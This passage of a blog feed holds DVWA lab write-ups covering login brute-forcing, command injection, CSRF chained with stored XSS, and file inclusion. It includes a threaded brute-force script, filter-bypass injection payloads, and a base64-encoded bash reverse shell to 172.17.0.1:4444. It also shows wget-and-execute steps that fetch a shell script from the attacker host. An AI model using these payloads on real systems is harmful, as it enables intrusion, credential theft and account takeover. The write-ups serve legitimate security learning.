</span>  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">,</span> <span class="n">threads</span><span class="p">):</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">messages</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span> <span class="c1"># Used to queue outputs by threads.
</span>    <span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
    <span class="c1"># Parse the cookie string (e.g "user=someUser; priv=somePriv"), there is probably a better way to do this :)
</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"; "</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
      <span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()]</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span> <span class="o">=</span> <span class="n">wordlist</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">threads</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="k">if</span> <span class="n">threads</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="n">threads</span><span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">False</span>

  <span class="c1"># Called when starting the bruteforce. Dispatches all threads.
</span>  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="c1"># Load the wordlist into a Queue object
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Loading wordlist..."</span><span class="p">);</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">words</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">()</span>
    <span class="n">rfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">wordlist</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
      <span class="n">line</span> <span class="o">=</span> <span class="n">rfo</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span> <span class="k">break</span> <span class="c1"># List exhausted
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="c1"># Start the threads.
</span>    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Starting </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="si">}</span><span class="s"> threads..."</span><span class="p">);</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">threads</span><span class="p">):</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">brute</span><span class="p">)</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="c1"># Loop and print logs.
</span>    <span class="k">while</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">and</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
      <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">get</span><span class="p">())</span>

  <span class="c1"># The thread function.
</span>  <span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="bp">self</span><span class="p">.</span><span class="n">abort</span><span class="p">:</span>
      <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
        <span class="k">break</span>
      <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">words</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
      <span class="c1"># Fetch the token.
</span>      <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="c1"># No need for regular expressions when you can just split and index your way to glory!!!
</span>      <span class="n">token</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"name='user_token' value='"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"'"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
      <span class="c1"># Attempt to login
</span>      <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Trying </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="n">body</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"?username=</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;user_token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">&amp;Login=Login"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">cookies</span><span class="p">).</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="s">"Username and/or password incorrect"</span> <span class="ow">in</span> <span class="n">body</span><span class="p">:</span> <span class="c1"># Login successful???
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">messages</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Authentiation successful: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">abort</span> <span class="o">=</span> <span class="bp">True</span> <span class="c1"># Signals other threads to quit.
</span>        <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;url&gt; &lt;cookie&gt; &lt;username&gt; &lt;wordlist&gt; &lt;threads&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">bruteforcer</span> <span class="o">=</span> <span class="n">l3_bruteforcer</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]))</span>
  <span class="n">bruteforcer</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing this with number of threads set to <code class="language-plaintext highlighter-rouge">1</code> worked;</p>

<p><img src="/assets/img/20220323121335.png" alt="" /></p>

<p>Setting the value of threads to more than <code class="language-plaintext highlighter-rouge">1</code> however, gave a false positive;</p>

<p><img src="/assets/img/20220323121547.png" alt="" /></p>

<p>Running the requests through a proxy, the threading appears to be messing up the CSRF token validation;</p>

<p><img src="/assets/img/20220323121801.png" alt="" /></p>

<p>This is likely because the token is tied to the session of a user, so by the time a token is issued for a request in one thread, other tokens issued to other threads will be invalidated. This makes the multi-threading feature added to the code completely useless :(</p>

<p><img src="/assets/img/20220327093554.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="ffuf" /><category term="bruteforce" /><category term="python" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA on login bruteforcing.]]></summary></entry><entry><title type="html">Command Injection - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html" rel="alternate" type="text/html" title="Command Injection - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html"><![CDATA[<p>This is an exercise in OWASP DVWA for <em>command injection</em>.</p>

<p><br /></p>

<h3 id="command-injection---dvwa">Command Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>This mode gave us an input field for an IP address. Following submission, and a short delay, some output that look to be the result of the <code class="language-plaintext highlighter-rouge">ping</code> command was displayed;</p>

<p><img src="/assets/img/20220323175128.png" alt="" /></p>

<p>The user input is submitted in a POST request;</p>

<p><img src="/assets/img/20220323175239.png" alt="" /></p>

<p>Since we do know our instance of DVWA is running on a linux host, we were able to inject code into the command by using a semi colon, which act as a command separator;</p>

<p><img src="/assets/img/20220323175709.png" alt="" /></p>

<p>I was able to spawn a shell on the box using a base64-encoded bash reverse shell;</p>

<p><img src="/assets/img/20220323180023.png" alt="" /></p>

<p><img src="/assets/img/20220323180043.png" alt="" /></p>

<p><img src="/assets/img/20220323180124.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, we are presented with the same form again;</p>

<p><img src="/assets/img/20220323180426.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">;</code> to inject commands simply hung the application for few secods, before returning blank result. Testing for other methods of command injection, we were able to inject code using a double pipe (<code class="language-plaintext highlighter-rouge">||</code>), which is used to execute a command if the previous command in the chain has failed;</p>

<p><img src="/assets/img/20220323180953.png" alt="" /></p>

<p>This injection can also be used to spawn a shell on the box;</p>

<p><img src="/assets/img/20220323181229.png" alt="" /></p>

<p><img src="/assets/img/20220323181249.png" alt="" /></p>

<p>Command injection using conditional operators like <code class="language-plaintext highlighter-rouge">||</code> is not ideal because they depend on the exit code of the primary command you are injecting into.  So I tried wrapping the injected command in backticks, which will take precedence over the primary command because it’s output will be used to construct the primary command, and it worked;</p>

<p><img src="/assets/img/20220323181652.png" alt="" /></p>

<p><img src="/assets/img/20220323181711.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>We got the same form again in this mode;</p>

<p><img src="/assets/img/20220323181932.png" alt="" /></p>

<p>Command injection using <code class="language-plaintext highlighter-rouge">||</code> works;</p>

<p><img src="/assets/img/20220323182443.png" alt="" /></p>

<p>However, injecting any command that has a whitespace appears to fail;</p>

<p><img src="/assets/img/20220323182510.png" alt="" /></p>

<p>This indicate there may be a filter that blocks input that contain whitespaces. Since we know it’s a linux host, we may be able to bypass this using the <em>internal field separator</em> (IFS) environment variable, which is <code class="language-plaintext highlighter-rouge">$IFS</code>. In my bash shell, this is set to a newline character <code class="language-plaintext highlighter-rouge">0x0a</code>;</p>

<p><img src="/assets/img/20220323182828.png" alt="" /></p>

<p>To my surprise, using the <code class="language-plaintext highlighter-rouge">$IFS</code> variable to bypass the filter didn’t work. However, while the command <code class="language-plaintext highlighter-rouge">ls -al</code> failed, the command <code class="language-plaintext highlighter-rouge">ls /</code> actually succeeded, which indicate whitespace is likely not what the filter is targetting. The only difference I can see between these two commands is the hyphen character (<code class="language-plaintext highlighter-rouge">-</code>).</p>

<p>If the application is indeed blocking the user of <code class="language-plaintext highlighter-rouge">-</code>, I can no longer use my base64-encoded reverse shell because I need to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code>. Checking the box for tools we can take advantage of, <code class="language-plaintext highlighter-rouge">wget</code> was found;</p>

<p><img src="/assets/img/20220323210702.png" alt="" /></p>

<p>I can download a file to current directory with<code class="language-plaintext highlighter-rouge">wget</code> without using any <code class="language-plaintext highlighter-rouge">-</code> character. So created a bash script on my box containing my reverse shell payload, and host it using python’s web server;</p>

<p><img src="/assets/img/20220323210841.png" alt="" /></p>

<p>Using the payload <code class="language-plaintext highlighter-rouge">|| wget http://172.17.0.1/shell.sh</code>, I was able to download it to the box. I then made it executable with <code class="language-plaintext highlighter-rouge">|| chmod +x shell.sh</code>, and ran it using <code class="language-plaintext highlighter-rouge">|| ./shell.sh</code>. This gave me a shell on the box;</p>

<p><img src="/assets/img/20220323211103.png" alt="" /></p>

<p><img src="/assets/img/20220323211202.png" alt="" /></p>

<p><img src="/assets/img/20220323211249.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="command injection" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for command injection.]]></summary></entry><entry><title type="html">CSRF + Stored XSS - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss.html" rel="alternate" type="text/html" title="CSRF + Stored XSS - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss.html"><![CDATA[<p>This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.</p>

<p><br /></p>

<h3 id="csrf-and-stored-xss---dvwa">CSRF and Stored XSS - DVWA</h3>
<p><br /></p>

<p>For this challenge, we will be chaining the CSRF vulnerability with stored XSS vulnerability since there is no other way to make another user in the application interact with our payload. We will be using the account of <strong>smithy</strong>, whose password is <code class="language-plaintext highlighter-rouge">password</code>, to target the user <strong>admin</strong>, which I am logged into in a private window.</p>

<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>For this mode, we are presented with a simple password reset form;</p>

<p><img src="/assets/img/20220324074556.png" alt="" /></p>

<p>Note that the form does not ask users to input their current passwords, and no CSRF token is used. The data is also submitted in a GET request, which will make it more convenient to exploit;</p>

<p><img src="/assets/img/20220324074734.png" alt="" /></p>

<p><img src="/assets/img/20220324074750.png" alt="" /></p>

<p>As the user <em>smithy</em>, I added a stored XSS payload that will reset the password of any user that visit the page to <code class="language-plaintext highlighter-rouge">hacked</code>;</p>

<p><img src="/assets/img/20220324075501.png" alt="" /></p>

<p>Going to the page as the user <strong>admin</strong>, we got some broken image thumbnail;</p>

<p><img src="/assets/img/20220324075616.png" alt="" /></p>

<p>So I tried to login using <code class="language-plaintext highlighter-rouge">admin:hacked</code>, and it worked!</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>Again, we were presented with the same form with no CSRF tokens or requirement to input current password. Attempt to exploit stored XSS in the <code class="language-plaintext highlighter-rouge">txtName</code> gave an error;</p>

<p><img src="/assets/img/20220324080456.png" alt="" /></p>

<p>Doing it in the <code class="language-plaintext highlighter-rouge">mtxMessage</code> field blanked out the body;</p>

<p><img src="/assets/img/20220324080753.png" alt="" /></p>

<p>Since the <code class="language-plaintext highlighter-rouge">txtName</code> field is only complaining about the length of the input, we could exploit this by setting up a short URL that redirect to our target URL. So I built a simple python program that can handle the redirect;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-------------------------------------------------------
# A simple script for setting up a static HTTP redirect.
#                      Author: https://4g3nt47.github.io
#-------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">threading</span>

<span class="c1"># Called in a separate thread. Handles the redirection.
</span><span class="k">def</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">target_url</span><span class="p">):</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"HTTP/1.1 302 Found</span><span class="se">\r\n</span><span class="s">Server: Apache/2.4.38</span><span class="se">\r\n</span><span class="s">Content-Length: 0</span><span class="se">\r\n</span><span class="s">Location: </span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="se">\n\r\n\r\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># Our main function.
</span><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">target_url</span><span class="p">):</span>
  <span class="c1"># Create the socket server.
</span>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Listening...."</span><span class="p">)</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
      <span class="c1"># Spawn a thread for the client.
</span>      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Redirecting </span><span class="si">{</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">..."</span><span class="p">)</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">redirect</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">target_url</span><span class="p">))</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
      <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
      <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;lhost&gt; &lt;lport&gt; &lt;target_url&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing it locally with <code class="language-plaintext highlighter-rouge">curl</code>, my program seems to be working;</p>

<p><img src="/assets/img/20220324084227.png" alt="" /></p>

<p>Now we can set our stored XSS exploit to redirect user to our HTTP redirector, which will further redirect to our CSRF URL. The first redirect can be achieved using <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag with a broken URL that executes the JS code defined by <code class="language-plaintext highlighter-rouge">onerror</code>;</p>

<p><img src="/assets/img/20220324084649.png" alt="" /></p>

<p><img src="/assets/img/20220324084837.png" alt="" /></p>

<p>Going to the XSS page as <strong>admin</strong>, our exploit was triggered;</p>

<p><img src="/assets/img/20220324085046.png" alt="" /></p>

<p><img src="/assets/img/20220324085206.png" alt="" /></p>

<p>The password reset worked, but the exploit is very obvious. So I tried doing it with the payload <code class="language-plaintext highlighter-rouge">&lt;img src='&lt;my-redirectors-URL&gt;'/&gt;</code>, and it worked. This is much more stealthier since target is not <em>visibly</em> redirected.</p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>Same password reset form as the previous levels, and the XSS payload used in [[#Difficulty Medium]] worked for this level too;</p>

<p><img src="/assets/img/20220324093512.png" alt="" /></p>

<p><img src="/assets/img/20220324093458.png" alt="" /></p>

<p>Going to the stored XSS infected page changed the password of <em>admin</em> to <code class="language-plaintext highlighter-rouge">hacked3</code>.</p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="stored xss" /><category term="csrf" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.]]></summary></entry><entry><title type="html">File Inclusion - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion.html" rel="alternate" type="text/html" title="File Inclusion - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion.html"><![CDATA[<p>This is an exercise in OWASP DVWA for local and remote file inclusion.</p>

<p><br /></p>

<h3 id="file-inclusion---dvwa">File Inclusion - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-low">Difficulty: Low</h4>
<p><br /></p>

<p>In this mode, we are presented with <strong>3</strong> URLs, both of which accept a filename as a value to the GET parameter <code class="language-plaintext highlighter-rouge">page</code>;</p>

<p><img src="/assets/img/20220324114353.png" alt="" /></p>

<p><img src="/assets/img/20220324114404.png" alt="" /></p>

<p>Changing the value to <code class="language-plaintext highlighter-rouge">/etc/hostname</code> gave me the hostname of the box, along with the rest of the page;</p>

<p><img src="/assets/img/20220324114631.png" alt="" /></p>

<p>That’s cool and all, but we want to see if we can get RCE using this <em>file inclusion</em> vulnerability. Since the default files assigned to the <code class="language-plaintext highlighter-rouge">page</code> parameter all end with <code class="language-plaintext highlighter-rouge">.php</code>, and no PHP code was seen in the HTML returned by the server, this indicate the file is not just read, but processed as PHP code. This means we can get code execution if we can trick the application into loading a malicious PHP file.</p>

<p>So I started testing for <em>remote file inclusion</em> vulnerability, which will make it much easier to execute arbitrary code, and it was found to be vulnerable;</p>

<p><img src="/assets/img/20220324115551.png" alt="" /></p>

<p><img src="/assets/img/20220324115607.png" alt="" /></p>

<p>So I created a PHP file that will execute a bash reverse shell, and saved it as <code class="language-plaintext highlighter-rouge">shell.php</code>;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash"</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Going to the URL <code class="language-plaintext highlighter-rouge">http://buster/dvwa/vulnerabilities/fi/?page=http://172.17.0.1/shell.php</code> gave me a shell on the box;</p>

<p><img src="/assets/img/20220324115844.png" alt="" /></p>

<p><img src="/assets/img/20220324115859.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, LFI was achieved by setting <code class="language-plaintext highlighter-rouge">page=/etc/hostname</code>;</p>

<p><img src="/assets/img/20220324120217.png" alt="" /></p>

<p>However, RFI no longer works when supplying a HTTP URL. This is probably due to some sort of filter the application is using. Fun fact about URL protocols: they are <strong>case insensitive</strong>. So <code class="language-plaintext highlighter-rouge">http://somehost.tld</code> is same as <code class="language-plaintext highlighter-rouge">HTTP://somehost.tld</code>. This could be used to easily bypass filters that do not account for this. Testing this on the application, i was able to achieve RFI, and gain code execution;</p>

<p><img src="/assets/img/20220324120753.png" alt="" /></p>

<p><img src="/assets/img/20220324120807.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>None of our previous LFI and RFI payloads work in this level. I was able to achieve LFI on the application using the <code class="language-plaintext highlighter-rouge">file:///</code> protocol;</p>

<p><img src="/assets/img/20220324121427.png" alt="" /></p>

<p>Testing for file inclusion using <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=&lt;file&gt;</code>, which could have being used to read the source code of the application for analysis, kept failing.</p>

<p>The LFI is still enough for RCE if we can chain it we any other vulnerability that allow us to write files on the server, and <em>DVWA</em> is vulnerable to arbitrary file upload.</p>

<p><br /></p>

<h4 id="bonus-lfi-to-rce-with-kadimus">Bonus: LFI to RCE with Kadimus</h4>
<p><br /></p>

<p><strong>Kadimus</strong> is a nice tool that can be used to easily scan for and exploit LFI vulnerabilities, and you can install it from <a href="https://github.com/P0cL4bs/kadimus">github</a>.</p>

<p>Running the tool using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>kadimus <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/fi/?page=include.php'</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">kadimus</code> was able to detect a few ways the application is vulnerable to LFI;</p>

<p><img src="/assets/img/20220327092755.png" alt="" /></p>

<p>Best thing about <code class="language-plaintext highlighter-rouge">kadimus</code> is it makes it very easy to go from LFI to <em>code execution</em>. Using the <em>data wrap</em> technique, this can be exploited with the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
